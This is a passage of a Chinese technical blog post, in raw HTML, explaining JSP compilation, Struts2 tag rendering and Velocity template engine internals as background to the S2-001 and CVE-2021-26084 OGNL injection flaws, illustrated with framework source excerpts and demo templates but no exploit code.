class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%<span class="meta">@taglib</span> prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;S2-001 Demo&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">  &lt;s:form action=<span class="string">&quot;login&quot;</span>&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;username&quot;</span> label=<span class="string">&quot;username&quot;</span> /&gt;</span><br><span class="line">    &lt;s:textfield name=<span class="string">&quot;password&quot;</span> label=<span class="string">&quot;password&quot;</span> /&gt;</span><br><span class="line">    &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">  &lt;/s:form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-原理解析"><a href="#2-2-原理解析" class="headerlink" title="2.2 原理解析"></a>2.2 原理解析</h3><h4 id="2-2-1-编译"><a href="#2-2-1-编译" class="headerlink" title="2.2.1 编译"></a>2.2.1 编译</h4><p>众所周知，jsp 运行时会被编译成class。细节如何</p><ul><li>何时进行的编译？</li><li>如何进行的编译？</li></ul><p>通常情况，是在第一次请求的时候，jsp 预编译成java代码，在编译成java字节码，也即class文件，由jsp引擎实现，目录在CATALINA_BASE 目录下。<br>具体是通过JDTCompiler，这里不不深入研究。</p><p>上文的中Demo 最终编译成的class 代码截取如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">index_jsp</span> <span class="keyword">extends</span> <span class="title">HttpJspBase</span> <span class="keyword">implements</span> <span class="title">JspSourceDependent</span>, <span class="title">JspSourceImports</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">_jspService</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">if</span> (!<span class="string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="string">&quot;HEAD&quot;</span>.equals(_jspx_method) &amp;&amp; !DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;</span><br><span class="line">...</span><br><span class="line">                response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">...</span><br><span class="line">                out.write(<span class="string">&quot;    &lt;title&gt;S2-001 Demo&lt;/title&gt;\n&quot;</span>);</span><br><span class="line">...</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>._jspx_meth_s_005fform_005f0(pageContext)) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">_jspx_meth_s_005fform_005f0</span><span class="params">(PageContext _jspx_page_context)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">...</span><br><span class="line">            _jspx_th_s_005fform_005f0.setAction(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>._jspx_meth_s_005ftextfield_005f0(_jspx_th_s_005fform_005f0, _jspx_page_context)) &#123;</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">if</span> (<span class="keyword">this</span>._jspx_meth_s_005ftextfield_005f1(_jspx_th_s_005fform_005f0, _jspx_page_context)) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">_jspx_meth_s_005ftextfield_005f0</span><span class="params">(JspTag _jspx_th_s_005fform_005f0, PageContext _jspx_page_context)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">...</span><br><span class="line">        TextFieldTag _jspx_th_s_005ftextfield_005f0 = (TextFieldTag)<span class="keyword">this</span>._005fjspx_005ftagPool_005fs_005ftextfield_0026_005fname_005flabel_005fnobody.get(TextFieldTag.class);</span><br><span class="line">...</span><br><span class="line">            _jspx_th_s_005ftextfield_005f0.setName(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f0.setLabel(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f0.doStartTag();</span><br><span class="line">            <span class="keyword">if</span> (_jspx_th_s_005ftextfield_005f0.doEndTag() == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">_jspx_meth_s_005ftextfield_005f1</span><span class="params">(JspTag _jspx_th_s_005fform_005f0, PageContext _jspx_page_context)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">...</span><br><span class="line">            _jspx_th_s_005ftextfield_005f1.setName(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f1.setLabel(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            _jspx_th_s_005ftextfield_005f1.doStartTag();</span><br><span class="line">            <span class="keyword">if</span> (_jspx_th_s_005ftextfield_005f1.doEndTag() == <span class="number">5</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-2-Tag-实现"><a href="#2-2-2-Tag-实现" class="headerlink" title="2.2.2 Tag 实现"></a>2.2.2 Tag 实现</h4><p>以_jspx_meth_s_005ftextfield_005f0 为例，最终是通过TextFieldTag class 实现的</p><ul><li>setxxx()：初始化，设置一些参数</li><li>doStartTag()：获取一些组件信息和属性赋值，总之是些初始化的工作</li><li>doEndTag()：在标签解析结束后需要做的事，如调用组件的 end() 方法</li></ul><p><img src="/images/pasted-250.png" alt="upload successful"></p><p>类似的Tag 还有很多，如上面一节中提到的</p><p><img src="/images/pasted-251.png" alt="upload successful"></p><h4 id="ComponentTagSupport"><a href="#ComponentTagSupport" class="headerlink" title="ComponentTagSupport"></a>ComponentTagSupport</h4><ul><li>BodyTagSupport 是servlet Tag 基础类</li><li>StrutsBodyTagSupport 是struts Tag 基础类，有几个直接子类，ComponentTagSupport/ iterators</li><li>ComponentTagSupport，其中几乎所有的struts tag类都继承ComponentTagSupport</li></ul><p>ComponentTagSupport 实现了doStartTag、doEndTag 接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Component component;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">doStartTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.component = <span class="keyword">this</span>.getBean(<span class="keyword">this</span>.getStack(), (HttpServletRequest)<span class="keyword">this</span>.pageContext.getRequest(), (HttpServletResponse)<span class="keyword">this</span>.pageContext.getResponse());</span><br><span class="line">    <span class="keyword">this</span>.populateParams();</span><br><span class="line">    <span class="keyword">boolean</span> evalBody = <span class="keyword">this</span>.component.start(<span class="keyword">this</span>.pageContext.getOut());</span><br><span class="line">    <span class="keyword">if</span> (evalBody) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.component.usesBody() ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">doEndTag</span><span class="params">()</span> <span class="keyword">throws</span> JspException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.component.end(<span class="keyword">this</span>.pageContext.getOut(), <span class="keyword">this</span>.getBody());</span><br><span class="line">    <span class="keyword">this</span>.component = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Component"><a href="#Component" class="headerlink" title="Component"></a>Component</h4><p>ComponentTagSupport 有个属性Component。什么是Component？可以理解为Tag 到html 的实现。Component 和Tag 基本是一一对应的，是ComponentTagSupport#getBean 接口定义的对应关系。例如TextFieldTag </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextFieldTag</span> <span class="keyword">extends</span> <span class="title">AbstractUITag</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Component <span class="title">getBean</span><span class="params">(ValueStack stack, HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TextField(stack, req, res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-252.png" alt="upload successful"></p><h4 id="UIBean"><a href="#UIBean" class="headerlink" title="UIBean"></a>UIBean</h4><p>UIBean 继承基础类Component，它的evaluateParams 方法实现了对html 元素属性进行赋值。这里是S2-001 漏洞产生的原因，本文不过多扩展，后文再详细跟踪。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">end</span><span class="params">(Writer writer, String body)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.evaluateParams();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.end(writer, body, <span class="keyword">false</span>);</span><br><span class="line">        <span class="keyword">this</span>.mergeTemplate(writer, <span class="keyword">this</span>.buildTemplateName(<span class="keyword">this</span>.template, <span class="keyword">this</span>.getDefaultTemplate()));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">        LOG.error(<span class="string">&quot;error when rendering&quot;</span>, var7);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">this</span>.popComponentStack();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x03-Velocity"><a href="#0x03-Velocity" class="headerlink" title="0x03 Velocity"></a>0x03 Velocity</h2><p>与JSP 编译成class 不一样，Velocity 是实时通过ConfluenceVelocityServlet 进行处理的。大致过程是解析成AST，再计算每个AST节点。</p><h3 id="3-1-Velocity-Demo"><a href="#3-1-Velocity-Demo" class="headerlink" title="3.1 Velocity Demo"></a>3.1 Velocity Demo</h3><p>背景知识不详细展开，具体可以参考官方文档【5】，或者文档【4】。直接看个最基础的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Person.java</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Persion</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">## hello.vm</span><br><span class="line">#set ($iAmVariable=&quot;good!&quot;)</span><br><span class="line">#set ($Person.name=&quot;kkk&quot;)</span><br><span class="line"></span><br><span class="line">Welcome $&#123;name&#125; to velocity.com</span><br><span class="line">today is $&#123;date&#125;.</span><br><span class="line"></span><br><span class="line">#foreach ($&#123;i&#125; in $&#123;list&#125;)</span><br><span class="line">    $&#123;i&#125;</span><br><span class="line">#end</span><br><span class="line"></span><br><span class="line">$&#123;Person.name&#125;</span><br></pre></td></tr></table></figure><!--more--><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># HelloVelocity.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloVelocity</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        VelocityEngine ve = <span class="keyword">new</span> VelocityEngine();</span><br><span class="line">        ve.setProperty(RuntimeConstants.RESOURCE_LOADER, <span class="string">&quot;classpath&quot;</span>);</span><br><span class="line">        ve.setProperty(<span class="string">&quot;classpath.resource.loader.class&quot;</span>, ClasspathResourceLoader.class.getName());</span><br><span class="line">        ve.init();</span><br><span class="line">        </span><br><span class="line">        Template t = ve.getTemplate(<span class="string">&quot;hello.vm&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        VelocityContext ctx = <span class="keyword">new</span> VelocityContext();</span><br><span class="line">        ctx.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;velocity&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;date&quot;</span>, (<span class="keyword">new</span> Date()).toString());</span><br><span class="line">        List temp = <span class="keyword">new</span> ArrayList();</span><br><span class="line">        temp.add(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        temp.add(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        ctx.put(<span class="string">&quot;list&quot;</span>, temp);</span><br><span class="line">        </span><br><span class="line">        Persion persion = <span class="keyword">new</span> Persion();</span><br><span class="line">        ctx.put(<span class="string">&quot;Person&quot;</span>, persion);</span><br><span class="line">        </span><br><span class="line">        StringWriter sw = <span class="keyword">new</span> StringWriter();</span><br><span class="line">        t.merge(ctx, sw);</span><br><span class="line">        System.out.println(sw);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中需要重点关注的几个概念：</p><ul><li>VelocityEngine</li><li>Template 模板</li><li>Template.merge 接口</li><li>VelocityContext 上下文</li><li>StringWriter</li></ul><h3 id="3-2-原理解析"><a href="#3-2-原理解析" class="headerlink" title="3.2 原理解析"></a>3.2 原理解析</h3><p>Velocity 也可以算是一种代码语言，也是通过AST 树进行翻译和执行。</p><h4 id="3-2-1-生成AST树"><a href="#3-2-1-生成AST树" class="headerlink" title="3.2.1 生成AST树"></a>3.2.1 生成AST树</h4><p>还是以上文的hello.vm 为例</p><p><img src="/images/pasted-230.png" alt="upload successful"></p><p>涉及到的AST 节点</p><ul><li>ASTText ：文本</li><li>ASTReference ：引用</li><li>ASTSetDirective set ：Set指令</li><li>ASTDirective ：指令</li><li>ASTWord ：关键字？</li><li>ASTBlock ：代码块？</li><li>ASTStringLiteral ：字符串</li><li>ASTExpression    ：表达式</li></ul><p><img src="/images/pasted-229.png" alt="upload successful"></p><p>当然，还有其他更多的节点</p><p>参考【3】中提到4 大类，这里直接引用</p><blockquote><p>Velocity的语法相对简单，所以它的语法节点并不是很多，总共有50几个，它们可以划分为如下几种类型。</p></blockquote><ul><li><p>块节点类型：主要用来表示一个代码块，它们本身并不表示某个具体的语法节点，也不会有什么渲染规则。这种类型的节点主要由ASTReference、ASTBlock和ASTExpression等组成。</p></li><li><p>扩展节点类型：这些节点可以被扩展，可以自己去实现，如我们上面提到的#foreach，它就是一个扩展类型的ASTDirective节点，我们同样可以自己再扩展一个ASTDirective类型的节点。</p></li><li><p>中间节点类型：位于树的中间，它的下面有子节点，它的渲染依赖于子节点才能完成，如ASTIfStatement和ASTSetDirective等。</p></li><li><p>叶子节点：它位于树的叶子上，没有子节点，这种类型的节点要么直接输出值，要么写到writer中，如ASTText和ASTTrue等。</p></li></ul><h5 id="Directive"><a href="#Directive" class="headerlink" title="Directive"></a>Directive</h5><p>这里展开讲讲扩展节点，velocity默认内置的Directive有以下</p><p><img src="/images/pasted-231.png" alt="upload successful"></p><p>在Struts中，有更多的Directive</p><p><img src="/images/pasted-232.png" alt="upload successful"></p><p>在Confluence中，有BodyTag/Tag/Param 指令，Tag 的实现是CVE-2021-26084 Ognl注入漏洞的原因。</p><p><img src="/images/pasted-233.png" alt="upload successful"></p><h4 id="3-2-2-执行AST"><a href="#3-2-2-执行AST" class="headerlink" title="3.2.2 执行AST"></a>3.2.2 执行AST</h4><p>与Ognl 的SimpleNode.getValueBody 接口类似，Velocity 的接口为SimpleNode.render/value</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># SimpleNode.java</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">render</span><span class="params">( InternalContextAdapter context, Writer writer)</span></span></span><br><span class="line"><span class="function">       <span class="keyword">throws</span> IOException, MethodInvocationException, ParseErrorException, ResourceNotFoundException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> i, k = jjtGetNumChildren();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">           jjtGetChild(i).render(context, writer);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这里就个区别，与Ognl不同，result不会作为前一个的参数。</p><h5 id="ASTSetDirective"><a href="#ASTSetDirective" class="headerlink" title="ASTSetDirective"></a>ASTSetDirective</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">render</span><span class="params">( InternalContextAdapter context, Writer writer)</span></span></span><br><span class="line"><span class="function">      <span class="keyword">throws</span> IOException, MethodInvocationException</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"><span class="comment">// 获取右边节点的值</span></span><br><span class="line">      Object value = right.value(context);</span><br><span class="line">      ...</span><br><span class="line">      <span class="comment">// 如果左边节点是个没有子节点的节点，那么直接放在context里面</span></span><br><span class="line">          <span class="keyword">if</span> (left.jjtGetNumChildren() == <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">              context.put( leftReference, value);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="comment">// 否则，会使用其他方式（例子中的Person 最终使用Person.setName invoke实现)</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">              left.setValue(context, value);</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><h5 id="ASTReference"><a href="#ASTReference" class="headerlink" title="ASTReference"></a>ASTReference</h5><p>引用，几个重要的步骤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># ASTReference#render</span><br><span class="line">value = execute(<span class="keyword">null</span>, context);</span><br><span class="line"></span><br><span class="line"># ASTReference#execute</span><br><span class="line">Object result = getVariableValue(context, rootString);</span><br></pre></td></tr></table></figure><h5 id="ASTStringLiteral"><a href="#ASTStringLiteral" class="headerlink" title="ASTStringLiteral"></a>ASTStringLiteral</h5><p>需要注意单双引号的区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set( $foo &#x3D; &quot;bar&quot;)</span><br><span class="line">#set( $foo1 &#x3D; &quot;$foo&quot;)</span><br><span class="line">#set( $foo2 &#x3D; &#39;$foo&#39;)</span><br><span class="line">#set( $foo3 &#x3D; $foo)</span><br><span class="line">$foo</span><br><span class="line">$foo1</span><br><span class="line">$foo2</span><br><span class="line">$foo3</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bar</span><br><span class="line">bar</span><br><span class="line">$foo</span><br><span class="line">bar</span><br></pre></td></tr></table></figure><blockquote><p>可以看到，默认情况单引号不解析Velocity中的可用变量。可以通过改变velocity.properties 中的stringliterals.interpolate=false配置来改变这种默认设置。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> <span class="keyword">boolean</span> interpolate = <span class="keyword">true</span>;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> Object <span class="title">init</span><span class="params">(InternalContextAdapter context, Object data)</span> <span class="keyword">throws</span> TemplateInitException</span>&#123;</span><br><span class="line">...</span><br><span class="line">       interpolate = rsvc.getBoolean(</span><br><span class="line">               RuntimeConstants.INTERPOLATE_STRINGLITERALS, <span class="keyword">true</span>)</span><br><span class="line">               &amp;&amp; getFirstToken().image.startsWith(<span class="string">&quot;\&quot;&quot;</span>)</span><br><span class="line">               &amp;&amp; ((getFirstToken().image.indexOf(<span class="string">&#x27;$&#x27;</span>) != -<span class="number">1</span>) || (getFirstToken().image</span><br><span class="line">                       .indexOf(<span class="string">&#x27;#&#x27;</span>) != -<span class="number">1</span>));</span><br></pre></td></tr></table></figure><h5 id="ASTDirective"><a href="#ASTDirective" class="headerlink" title="ASTDirective"></a>ASTDirective</h5><p>ASTSetDirective 名称上可能想当然继承ASTDirective，但是并非如此。ASTDirective 有两个属性</p><ul><li>directive            为Directive类型，也就是前文讲到的各种扩展节点</li><li>directiveName        </li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ASTDirective</span> <span class="keyword">extends</span> <span class="title">SimpleNode</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Directive directive = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String directiveName = <span class="string">&quot;&quot;</span>;</span><br><span class="line">...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">render</span><span class="params">( InternalContextAdapter context, Writer writer)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException,MethodInvocationException, ResourceNotFoundException, ParseErrorException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">            directive.render(context, writer, <span class="keyword">this</span>);</span><br></pre></td></tr></table></figure><p>ASTDirective 的render 接口实际调用的是directive 的render，具体的逻辑在每个Directive 实现类里面。</p><h3 id="3-3-Struts2-下的Velocity"><a href="#3-3-Struts2-下的Velocity" class="headerlink" title="3.3 Struts2 下的Velocity"></a>3.3 Struts2 下的Velocity</h3><p>几个关键的Velocity包</p><ol><li><p>velocity            核心</p></li><li><p>velocity-tools    和web相关的一些支持</p></li><li><p>struts-core        有内置velocity的一些支持</p><p> 在org.apache.struts2.views.velocity 目录下</p><ul><li>components            各种Directive 指令支持，例如form</li><li>StrutsResourceLoader</li><li>StrutsVelocityContext</li><li>VelocityManager</li></ul></li></ol><h4 id="VelocityManager"><a href="#VelocityManager" class="headerlink" title="VelocityManager"></a>VelocityManager</h4><p>负责Velocity 的环境准备</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VelocityManager</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> VelocityEngine velocityEngine;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> String[] chainedContextNames;</span><br><span class="line">    <span class="keyword">private</span> Properties velocityProperties;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 生成 StrutsVelocityContext</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Context <span class="title">createContext</span><span class="params">(ValueStack stack, HttpServletRequest req, HttpServletResponse res)</span> </span>&#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="StrutsVelocityContext"><a href="#StrutsVelocityContext" class="headerlink" title="StrutsVelocityContext"></a>StrutsVelocityContext</h4><p>StrutsVelocityContext 继承VelocityContext，且重写了internalGet 借口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 